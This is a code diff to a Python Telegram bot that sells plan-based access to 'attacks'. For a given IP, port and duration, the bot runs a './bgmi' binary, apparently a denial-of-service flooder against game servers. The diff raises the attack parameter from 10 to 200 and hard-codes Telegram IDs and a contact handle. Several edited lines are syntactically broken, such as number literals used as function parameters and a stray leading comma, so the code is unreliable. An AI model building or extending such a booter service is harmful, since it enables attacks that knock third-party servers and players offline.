@@ -90,12 +90,12 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 200")
     await process.communicate()
 
-def is_user_admin(user_id, chat_id):
+def is_user_admin(6129136659, 1002122385534):
     try:
-        return bot.get_chat_member(chat_id, user_id).status in ['6129136659', '6129136659']
+        return bot.get_chat_member(,1002122385534,6129136659).status in ['6129136659', '6129136659']
     except:
         return False
 
@@ -152,9 +152,9 @@ def attack_command(message):
     chat_id = message.chat.id
 
     try:
-        user_data = users_collection.find_one({"user_id": user_id})
+        user_data = users_collection.find_one({"user_id": 6129136659})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
+            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the @O_P_J_I_R_E_N.")
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
@@ -176,9 +176,9 @@ def attack_command(message):
     chat_id = message.chat.id
 
     try:
-        user_data = users_collection.find_one({"user_id": user_id})
+        user_data = users_collection.find_one({"user_id": 6129136659})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the @O_P_J_I_R_E_N.*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
@@ -242,25 +242,25 @@ def handle_message(message):
         attack_command(message)
     elif message.text == "Canary Download✔️":
         bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/OPJIREN/638*", parse_mode='Markdown')
-    elif message.text == "My Account🏦":
+    elif message.text == "@O_P_J_I_R_E_N🏦":
         user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
+        user_data = users_collection.find_one({"@O_P_J_I_R_E_N": 6129136659})
         if user_data:
             username = message.from_user.username
             plan = user_data.get('plan', 'N/A')
             valid_until = user_data.get('valid_until', 'N/A')
             current_time = datetime.now().isoformat()
-            response = (f"*USERNAME: {username}\n"
+            response = (f"*@O_P_J_I_R_E_N: {username}\n"
                         f"Plan: {plan}\n"
                         f"Valid Until: {valid_until}\n"
                         f"Current Time: {current_time}*")
         else:
-            response = "*No account information found. Please contact the administrator.*"
+            response = "*No account information found. Please contact the @O_P_J_I_R_E_N.*"
         bot.reply_to(message, response, parse_mode='Markdown')
     elif message.text == "Help❓":
         bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
-    elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
+    elif message.text == "@O_P_J_I_R_E_N✔️":
+        bot.reply_to(message, "*@O_P_J_I_R_E_N*", parse_mode='Markdown')
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
